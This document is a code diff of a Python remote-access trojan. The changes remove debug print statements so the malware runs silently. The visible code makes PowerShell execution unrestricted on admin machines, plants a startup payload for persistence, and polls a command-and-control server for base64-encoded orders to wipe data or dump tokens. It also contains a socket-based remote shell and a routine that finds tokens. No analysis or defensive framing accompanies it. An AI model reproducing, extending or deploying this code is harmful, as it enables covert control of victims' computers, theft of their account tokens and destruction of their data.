@@ -54,7 +54,6 @@ def createStartupPayload(SCRIPTPATH):
 
 def onExec():
 	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
-		print(sys.argv[0])
 		subprocess.run(["powershell", "-Command", "Set-ExecutionPolicy unrestricted"])
 		createStartupPayload(TARGET_DIR)
 	else:
@@ -82,7 +81,6 @@ def idleLoop():
 			IP_ADDR  = urlopen(Request("https://ident.me/")).read().decode('ascii')
 			COMMANDS = json.loads(base64.urlsafe_b64decode(urlopen(Request(f'{CNC_URL}2/')).read().decode('ascii')).decode('ascii'))
 
-			print("polled")
 			if (IP_ADDR or '*' in COMMANDS['IP_ADDR']) and COMMANDS['HASH'] != EXEC_HASH:
 				EXEC_HASH = COMMANDS['HASH']
 				for COMMAND in COMMANDS['C']:
@@ -92,11 +90,10 @@ def idleLoop():
 						wipe()
 					elif COMMAND == "DUMP_TOKEN":
 						dumpTokens()
-					print("executed")
 
 			time.sleep((secrets.randbelow(POLL_TIME) + POLL_TIME) * 30)	
 		except Exception as e: #DEBUGGINZ
-			print(e)
+	
 			time.sleep((secrets.randbelow(POLL_TIME) + POLL_TIME) * 30)	
 			boot();
 
@@ -135,7 +132,6 @@ def processSend(SOCKET, PROCESS):
 		try:
 			SOCKET.send(PROCESS.stdout.read(1))
 		except Exception as ERROR:
-			print(ERROR)
 			break
 
 def shell():
@@ -161,7 +157,7 @@ def shell():
 		pass
 
 	except Exception as e:
-		print(e)
+		pass
 
 #SHIT4AFTEREXEC KEN BE REMOVED LOLZ
 def findToken(PATH):
